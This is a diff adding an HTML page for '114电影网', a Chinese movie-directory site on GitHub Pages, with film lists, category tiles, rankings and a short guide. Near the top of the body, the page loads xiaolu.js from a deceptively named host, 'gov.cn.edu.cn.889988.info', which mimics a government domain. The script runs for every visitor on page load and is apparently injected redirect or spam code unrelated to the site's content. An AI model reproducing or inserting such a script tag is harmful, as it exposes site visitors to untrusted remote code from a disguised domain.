@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="114电影网 - 你的电影专属号码簿，一号码片、极简检索、全类型片单，快速找到想看的每一部电影。">
+<meta name="keywords" content="114电影网,114dianyingwang-wap,电影号码簿,电影检索,电影片单,极简电影,114电影">
+<meta name="author" content="114电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="114电影网 | 你的电影专属号码簿">
+<meta property="og:description" content="一号码片、极简检索、全类型片单，快速找到想看的每一部电影。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://114dianyingwang-wap.github.io">
+<meta property="og:site_name" content="114电影网">
+<link rel="canonical" href="https://114dianyingwang-wap.github.io">
+<title>114电影网 | 你的电影专属号码簿 - 114dianyingwang-wap.github.io</title>
+<style>
+/* ============ 基础 ============ */
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#0e1116;
+  --bg2:#161b22;
+  --card:#1c232d;
+  --line:#2a323d;
+  --ink:#e6edf3;
+  --muted:#8b97a3;
+  --cyan:#39d5e6;
+  --cyan-d:#1fb6c7;
+  --amber:#ffb020;
+  --green:#3ddc97;
+  --radius:14px;
+}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;overflow-x:hidden;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;
+  background:
+    linear-gradient(rgba(57,213,230,.035) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(57,213,230,.035) 1px,transparent 1px);
+  background-size:46px 46px;
+}
+a{color:inherit;text-decoration:none;}
+ul{list-style:none;}
+.container{max-width:1180px;margin:0 auto;padding:0 22px;}
+.mono{font-family:"SFMono-Regular",Consolas,monospace;}
+
+/* ============ 顶部 ============ */
+header.site{
+  position:sticky;top:0;z-index:1000;background:rgba(14,17,22,.94);
+  backdrop-filter:blur(10px);border-bottom:1px solid var(--line);
+}
+.header-in{display:flex;align-items:center;justify-content:space-between;gap:18px;height:70px;}
+.logo{display:flex;align-items:center;gap:14px;}
+.logo .digits{
+  display:flex;gap:4px;
+}
+.logo .digits i{
+  width:28px;height:40px;border-radius:7px;display:grid;place-items:center;
+  background:linear-gradient(180deg,var(--cyan),var(--cyan-d));
+  color:#04242a;font-weight:900;font-size:22px;font-style:normal;
+  box-shadow:0 4px 14px rgba(57,213,230,.4);
+}
+.logo .txt b{font-size:19px;letter-spacing:2px;}
+.logo .txt small{font-size:11px;color:var(--muted);letter-spacing:2px;}
+nav.primary{display:flex;align-items:center;gap:4px;}
+nav.primary a{
+  padding:9px 15px;font-size:15px;letter-spacing:1px;border-radius:var(--radius);
+  transition:.25s;color:var(--muted);
+}
+nav.primary a:hover{background:var(--card);color:var(--cyan);}
+.btn-call{
+  padding:10px 22px;border:none;border-radius:var(--radius);
+  background:linear-gradient(135deg,var(--cyan),var(--cyan-d));color:#04242a;
+  font-weight:900;font-size:15px;letter-spacing:1px;cursor:pointer;transition:.3s;
+}
+.btn-call:hover{transform:translateY(-2px);box-shadow:0 10px 28px rgba(57,213,230,.4);}
+.burger{display:none;color:var(--cyan);cursor:pointer;font-size:26px;}
+
+/* ============ Hero / 拨号 ============ */
+.hero{padding:88px 0 70px;text-align:center;position:relative;}
+.hero .badge{
+  display:inline-flex;align-items:center;gap:8px;padding:8px 18px;border-radius:20px;
+  background:rgba(57,213,230,.1);border:1px solid rgba(57,213,230,.35);color:var(--cyan);
+  font-size:13px;letter-spacing:2px;margin-bottom:26px;
+}
+.hero .badge .blink{width:8px;height:8px;border-radius:50%;background:var(--green);animation:blink 1.4s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.25;}}
+.hero h1{font-size:clamp(34px,7.5vw,66px);font-weight:900;letter-spacing:2px;line-height:1.2;}
+.hero h1 .out{color:var(--cyan);}
+.hero .lead{margin-top:18px;font-size:17px;color:var(--muted);letter-spacing:1px;}
+/* 拨号盘 */
+.dial{margin-top:48px;max-width:520px;margin-left:auto;margin-right:auto;}
+.dial-display{
+  background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  padding:18px 24px;text-align:left;display:flex;align-items:center;gap:14px;margin-bottom:18px;
+}
+.dial-display .lbl{font-size:12px;color:var(--muted);letter-spacing:2px;white-space:nowrap;}
+.dial-display .val{
+  font-size:30px;font-weight:900;letter-spacing:6px;color:var(--cyan);flex:1;text-align:center;
+}
+.dial-grid{display:grid;gap:10px;grid-template-columns:repeat(3,1fr);}
+.key{
+  background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  padding:16px 0;font-size:22px;font-weight:900;color:var(--ink);cursor:pointer;transition:.2s;
+}
+.key:hover{border-color:var(--cyan);color:var(--cyan);transform:scale(1.04);}
+.key.wide{grid-column:span 2;font-size:14px;letter-spacing:2px;color:var(--muted);}
+
+/* ============ 栏目通用 ============ */
+section.block{padding:74px 0;}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin-bottom:36px;flex-wrap:wrap;}
+.sec-head .no{color:var(--cyan);font-size:14px;letter-spacing:2px;font-weight:900;}
+.sec-head h2{font-size:clamp(22px,3.4vw,30px);font-weight:900;letter-spacing:2px;}
+.sec-head .sub{margin-left:auto;font-size:14px;color:var(--muted);}
+
+/* ============ 栏目一：号码簿列表（表格化行） ============ */
+.directory{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;}
+.dir-row{
+  display:grid;grid-template-columns:100px 1.6fr 1fr 110px;align-items:center;
+  padding:18px 22px;border-bottom:1px solid var(--line);transition:.25s;cursor:pointer;gap:14px;
+}
+.dir-row:last-child{border-bottom:none;}
+.dir-row:hover{background:rgba(57,213,230,.06);}
+.dir-row .num{
+  font-size:26px;font-weight:900;color:var(--bg);background:linear-gradient(135deg,var(--cyan),var(--cyan-d));
+  border-radius:10px;padding:6px 0;text-align:center;letter-spacing:1px;
+}
+.dir-row .info h4{font-size:18px;font-weight:800;letter-spacing:1px;}
+.dir-row .info p{font-size:13px;color:var(--muted);}
+.dir-row .tags span{
+  display:inline-block;font-size:12px;padding:3px 10px;border-radius:20px;margin:2px 4px 2px 0;
+  background:rgba(57,213,230,.12);color:var(--cyan);border:1px solid rgba(57,213,230,.25);
+}
+.dir-row .rate{text-align:right;font-size:15px;font-weight:900;color:var(--amber);}
+
+/* ============ 栏目二：分类徽章墙（Bento 网格） ============ */
+.bento{display:grid;gap:14px;grid-template-columns:repeat(4,1fr);grid-auto-rows:120px;}
+.bto{grid-row:span 1;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:18px;transition:.3s;cursor:pointer;display:flex;flex-direction:column;justify-content:space-between;overflow:hidden;position:relative;}
+.bto:hover{border-color:var(--cyan);transform:translateY(-4px);box-shadow:0 12px 30px rgba(57,213,230,.14);}
+.bto.w2{grid-row:span 2;}
+.bto.w3{grid-row:span 2;grid-column:span 2;}
+.bto .ic{font-size:26px;}
+.bto h4{font-size:17px;font-weight:800;letter-spacing:1px;}
+.bto small{font-size:12px;color:var(--muted);}
+.bto::after{content:"";position:absolute;right:-30px;bottom:-30px;width:90px;height:90px;border-radius:50%;background:rgba(57,213,230,.08);}
+.bto.ac::after{background:rgba(255,176,32,.1);}
+.bto.gn::after{background:rgba(61,220,151,.1);}
+
+/* ============ 栏目三：热门排行（数字阶梯） ============ */
+.ladder{display:grid;gap:16px;grid-template-columns:1.1fr .9fr;}
+.step{display:flex;align-items:center;gap:18px;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:18px 20px;transition:.25s;cursor:pointer;}
+.step:hover{border-color:var(--cyan);}
+.step .big-no{font-size:34px;font-weight:900;color:var(--bg);width:56px;height:56px;border-radius:12px;display:grid;place-items:center;flex-shrink:0;background:linear-gradient(135deg,var(--cyan),var(--cyan-d));}
+.step.s2 .big-no{background:linear-gradient(135deg,var(--muted),#5a6470);}
+.step.s3 .big-no{background:linear-gradient(135deg,var(--amber),#c98a00);}
+.step .ttl h4{font-size:17px;font-weight:800;}
+.step .ttl p{font-size:13px;color:var(--muted);}
+.step .sc{margin-left:auto;font-size:20px;font-weight:900;color:var(--amber);}
+.rank-side h3{font-size:20px;font-weight:900;margin-bottom:16px;letter-spacing:1px;}
+.rank-side li{display:flex;align-items:center;gap:12px;padding:11px 0;border-bottom:1px dashed var(--line);font-size:15px;}
+.rank-side li:last-child{border-bottom:none;}
+.rank-side li .mini{color:var(--cyan);font-size:13px;font-weight:900;width:26px;}
+.rank-side li em{margin-left:auto;font-style:normal;color:var(--muted);font-size:13px;}
+
+/* ============ 栏目四：观影指南（时间线） ============ */
+.tline{position:relative;padding-left:34px;}
+.tline::before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:2px;background:linear-gradient(180deg,var(--cyan),transparent);}
+.node{position:relative;margin-bottom:26px;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px 24px;transition:.25s;}
+.node:hover{border-color:var(--cyan);}
+.node::before{
+  content:attr(data-n);position:absolute;left:-34px;top:22px;width:22px;height:22px;border-radius:50%;
+  background:var(--cyan);color:#04242a;font-size:12px;font-weight:900;display:grid;place-items:center;
+}
+.node .when{font-size:13px;color:var(--cyan);letter-spacing:2px;margin-bottom:6px;}
+.node h4{font-size:19px;font-weight:800;margin-bottom:8px;}
+.node p{font-size:14.5px;color:var(--muted);}
+
+/* ============ 栏目五：关于（终端窗口） ============ */
+.terminal{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;}
+.term-bar{background:var(--bg2);padding:12px 18px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--line);}
+.term-bar .dot{width:12px;height:12px;border-radius:50%;background:#ff5f57;}
+.term-bar .dot:nth-child(2){background:#febc2e;}
+.term-bar .dot:nth-child(3){background:#28c840;}
+.term-bar .title{margin-left:12px;font-size:13px;color:var(--muted);}
+.term-body{padding:26px 24px;font-size:15px;line-height:2;}
+.term-body .prompt{color:var(--cyan);}
+.term-body .cmd{color:var(--ink);}
+.term-body .out{color:var(--green);}
+.term-body .cmt{color:var(--muted);}
+.cursor{display:inline-block;width:9px;background:var(--cyan);animation:blink 1s infinite;}
+
+/* ============ 页脚 ============ */
+footer{background:var(--bg2);border-top:1px solid var(--line);padding:54px 0 26px;margin-top:50px;}
+.foot-grid{display:grid;gap:34px;grid-template-columns:1.6fr 1fr 1fr 1fr;margin-bottom:32px;}
+.foot-grid .brand b{font-size:20px;letter-spacing:2px;}
+.foot-grid .brand b span{color:var(--cyan);}
+.foot-grid .brand p{color:var(--muted);font-size:14px;margin-top:12px;}
+.foot-col h5{font-size:14px;letter-spacing:2px;margin-bottom:14px;color:var(--cyan);}
+.foot-col a{display:block;color:var(--muted);font-size:14px;padding:5px 0;transition:.2s;}
+.foot-col a:hover{color:var(--cyan);padding-left:6px;}
+.copy{border-top:1px solid var(--line);padding-top:22px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:13px;color:var(--muted);}
+
+/* ============ 响应式 ============ */
+@media(max-width:960px){
+  nav.primary{display:none;position:absolute;top:70px;left:0;right:0;flex-direction:column;background:var(--bg);padding:16px;border-bottom:1px solid var(--line);}
+  nav.primary.open{display:flex;}
+  nav.primary a{width:100%;text-align:center;}
+  .burger{display:block;}
+  .dir-row{grid-template-columns:70px 1fr;gap:12px;}
+  .dir-row .tags,.dir-row .rate{display:none;}
+  .bento{grid-template-columns:repeat(2,1fr);grid-auto-rows:110px;}
+  .bto.w3{grid-column:span 2;}
+  .ladder{grid-template-columns:1fr;}
+}
+@media(max-width:520px){
+  .hero{padding:56px 0 44px;}
+  section.block{padding:54px 0;}
+  .foot-grid{grid-template-columns:1fr 1fr;}
+  .dial-display .val{font-size:22px;letter-spacing:3px;}
+  .key{font-size:19px;padding:14px 0;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== 顶部 ===== -->
+<header class="site">
+  <div class="container header-in">
+    <a href="#" class="logo">
+      <span class="digits"><i>1</i><i>1</i><i>4</i></span>
+      <span class="txt"><b>114<b class="mono" style="color:var(--cyan)">电影网</b></b><small>YOUR FILM DIRECTORY</small></span>
+    </a>
+    <nav class="primary" id="nav">
+      <a href="#home">首页</a>
+      <a href="#dir">号码簿</a>
+      <a href="#cat">分类</a>
+      <a href="#hot">热门</a>
+      <a href="#guide">指南</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="btn-call" onclick="location.href='#'">↘ 拨号找片</button>
+    <span class="burger" onclick="document.getElementById('nav').classList.toggle('open')">☰</span>
+  </div>
+</header>
+
+<!-- ===== Hero / 拨号盘 ===== -->
+<section class="hero" id="home">
+  <div class="container">
+    <span class="badge"><span class="blink"></span>号码簿服务在线 · 7×24h</span>
+    <h1>拨 <span class="out">114</span>，<br>找到你想看的每一部电影</h1>
+    <p class="lead">一号码片 · 极简检索 · 全类型片单 —— 你的电影专属号码簿</p>
+
+    <div class="dial">
+      <div class="dial-display">
+        <span class="lbl">号码簿</span>
+        <span class="val mono">1 1 4</span>
+      </div>
+      <div class="dial-grid">
+        <div class="key">1</div><div class="key">2</div><div class="key">3</div>
+        <div class="key">4</div><div class="key">5</div><div class="key">6</div>
+        <div class="key">7</div><div class="key">8</div><div class="key">9</div>
+        <div class="key">★</div><div class="key">0</div><div class="key">⌫</div>
+        <div class="key wide">随机推荐一部</div>
+        <div class="key">搜索</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：号码簿 ===== -->
+<section class="block" id="dir">
+  <div class="container">
+    <div class="sec-head"><span class="no">[01]</span><h2>电影号码簿</h2><a href="#" class="sub">查看全部 ›</a></div>
+    <div class="directory">
+      <div class="dir-row">
+        <div class="num">NO.1</div>
+        <div class="info"><h4>肖申克的救赎</h4><p>希望让人自由 · 1994</p></div>
+        <div class="tags"><span>剧情</span><span>经典</span></div>
+        <div class="rate">9.7</div>
+      </div>
+      <div class="dir-row">
+        <div class="num">NO.2</div>
+        <div class="info"><h4>阿甘正传</h4><p>人生就像一盒巧克力 · 1994</p></div>
+        <div class="tags"><span>剧情</span><span>励志</span></div>
+        <div class="rate">9.5</div>
+      </div>
+      <div class="dir-row">
+        <div class="num">NO.3</div>
+        <div class="info"><h4>星际穿越</h4><p>爱是唯一的答案 · 2014</p></div>
+        <div class="tags"><span>科幻</span><span>烧脑</span></div>
+        <div class="rate">9.4</div>
+      </div>
+      <div class="dir-row">
+        <div class="num">NO.4</div>
+        <div class="info"><h4>这个杀手不太冷</h4><p>关于爱与救赎 · 1994</p></div>
+        <div class="tags"><span>动作</span><span>经典</span></div>
+        <div class="rate">9.4</div>
+      </div>
+      <div class="dir-row">
+        <div class="num">NO.5</div>
+        <div class="info"><h4>千与千寻</h4><p>宫崎骏的奇幻世界 · 2001</p></div>
+        <div class="tags"><span>动画</span><span>奇幻</span></div>
+        <div class="rate">9.4</div>
+      </div>
+      <div class="dir-row">
+        <div class="num">NO.6</div>
+        <div class="info"><h4>盗梦空间</h4><p>梦里梦外皆虚实 · 2010</p></div>
+        <div class="tags"><span>科幻</span><span>悬疑</span></div>
+        <div class="rate">9.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：分类徽章墙 ===== -->
+<section class="block" id="cat" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-head"><span class="no">[02]</span><h2>按分类检索</h2><a href="#" class="sub">12+ 类型 ›</a></div>
+    <div class="bento">
+      <div class="bto w3"><span class="ic">🎬</span><h4>动作 / 冒险</h4><small>1,240 部片单</small></div>
+      <div class="bto"><span class="ic">🔍</span><h4>悬疑</h4><small>886 部</small></div>
+      <div class="bto ac"><span class="ic">💕</span><h4>爱情</h4><small>902 部</small></div>
+      <div class="bto"><span class="ic">😂</span><h4>喜剧</h4><small>1,033 部</small></div>
+      <div class="bto gn"><span class="ic">🚀</span><h4>科幻</h4><small>614 部</small></div>
+      <div class="bto w2"><span class="ic">🐉</span><h4>奇幻 / 魔幻</h4><small>527 部 · 构建全新世界</small></div>
+      <div class="bto"><span class="ic">😱</span><h4>恐怖</h4><small>318 部</small></div>
+      <div class="bto ac"><span class="ic">🌱</span><h4>治愈</h4><small>445 部</small></div>
+      <div class="bto gn"><span class="ic">📜</span><h4>历史</h4><small>376 部</small></div>
+      <div class="bto"><span class="ic">🎭</span><h4>文艺</h4><small>509 部</small></div>
+      <div class="bto"><span class="ic">👶</span><h4>动画</h4><small>688 部</small></div>
+      <div class="bto ac"><span class="ic">🏆</span><h4>经典</h4><small>永不褪色</small></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：热门排行 ===== -->
+<section class="block" id="hot" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-head"><span class="no">[03]</span><h2>今日热门检索</h2><span class="sub">实时更新</span></div>
+    <div class="ladder">
+      <div>
+        <div class="step">
+          <span class="big-no">1</span>
+          <div class="ttl"><h4>奥本海默</h4><p>传记 · 历史 · 2023</p></div>
+          <span class="sc">9.1</span>
+        </div>
+        <div class="step s2" style="margin-top:16px;">
+          <span class="big-no">2</span>
+          <div class="ttl"><h4>周处除三害</h4><p>动作 · 犯罪 · 2023</p></div>
+          <span class="sc">8.2</span>
+        </div>
+        <div class="step s3" style="margin-top:16px;">
+          <span class="big-no">3</span>
+          <div class="ttl"><h4>坠落的审判</h4><p>剧情 · 悬疑 · 2023</p></div>
+          <span class="sc">8.7</span>
+        </div>
+      </div>
+      <div class="rank-side">
+        <h3>上升最快</h3>
+        <ul>
+          <li><span class="mini">04</span>热辣滚烫 <em>8.1</em></li>
+          <li><span class="mini">05</span>第二十条 <em>7.8</em></li>
+          <li><span class="mini">06</span>飞驰人生 2 <em>7.7</em></li>
+          <li><span class="mini">07</span>你想活出怎样的人生 <em>8.0</em></li>
+          <li><span class="mini">08</span>哥斯拉大战金刚 2 <em>6.5</em></li>
+          <li><span class="mini">09</span>沙丘 2 <em>8.2</em></li>
+          <li><span class="mini">10</span>头脑特工队 2 <em>8.4</em></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：观影指南 ===== -->
+<section class="block" id="guide" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-head"><span class="no">[04]</span><h2>观影指南</h2><a href="#" class="sub">更多攻略 ›</a></div>
+    <div class="tline">
+      <div class="node" data-n="01">
+        <div class="when">STEP 01 · 选心情</div>
+        <h4>先确定今天想看什么情绪</h4>
+        <p>想大笑、想哭、想烧脑还是想被治愈？按心情挑片比按评分更靠谱，114电影网帮你用最短路径找到对的那一部。</p>
+      </div>
+      <div class="node" data-n="02">
+        <div class="when">STEP 02 · 查号码簿</div>
+        <h4>每个类型都有一份精选清单</h4>
+        <p>号码簿里收录了高分佳作、冷门遗珠与经典重温，告别片荒，不再为"今晚看什么"发愁。</p>
+      </div>
+      <div class="node" data-n="03">
+        <div class="when">STEP 03 · 看排行</div>
+        <h4>参考热度，也保留自己的判断</h4>
+        <p>实时热门与上升最快榜单让你不错过新片，但最终的选择权，永远在你手里。</p>
+      </div>
+      <div class="node" data-n="04">
+        <div class="when">STEP 04 · 写手记</div>
+        <h4>把好电影，存进自己的号码簿</h4>
+        <p>每一次观影都是一次对话，记录下那一刻的感动，下次想重温时，一查便知。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：关于（终端） ===== -->
+<section class="block" id="about" style="padding-top:0;">
+  <div class="container">
+    <div class="sec-head"><span class="no">[05]</span><h2>关于 114电影网</h2></div>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="title">guest@114film:~</span></div>
+      <div class="term-body mono">
+        <div><span class="prompt">$</span> <span class="cmd">whoami</span></div>
+        <div class="out">114电影网 —— 你的电影专属号码簿</div>
+        <div style="margin-top:10px;"><span class="prompt">$</span> <span class="cmd">cat about.txt</span></div>
+        <div class="cmt"># 我们做了什么</div>
+        <div>· 精选高分佳作与冷门遗珠，告别片荒</div>
+        <div>· 12+ 电影类型，多维检索快速定位</div>
+        <div>· 实时热门榜单与上升最快影片</div>
+        <div>· 真实影迷手记，而非冰冷的数字</div>
+        <div style="margin-top:10px;"><span class="prompt">$</span> <span class="cmd">echo $MISSION</span></div>
+        <div class="out">"拨 114，找到你想看的每一部电影。"</div>
+        <div style="margin-top:10px;"><span class="prompt">$</span> <span class="cursor">&nbsp;</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="brand"><b><span>114</span>电影网</b><p>你的电影专属号码簿。一号码片、极简检索、全类型片单，快速找到想看的每一部电影。</p></div>
+      <div class="foot-col"><h5>号码簿</h5><a href="#">高分榜</a><a href="#">最新上映</a><a href="#">冷门宝藏</a><a href="#">经典重温</a></div>
+      <div class="foot-col"><h5>分类</h5><a href="#">动作</a><a href="#">悬疑</a><a href="#">爱情</a><a href="#">治愈</a></div>
+      <div class="foot-col"><h5>关于</h5><a href="#about">网站介绍</a><a href="#">使用指南</a><a href="#">投稿合作</a><a href="#">帮助中心</a></div>
+    </div>
+    <div class="copy">
+      <span>© 2026 114电影网（114dianyingwang-wap.github.io）· 你的电影专属号码簿</span>
+      <span>网址：114dianyingwang-wap.github.io</span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
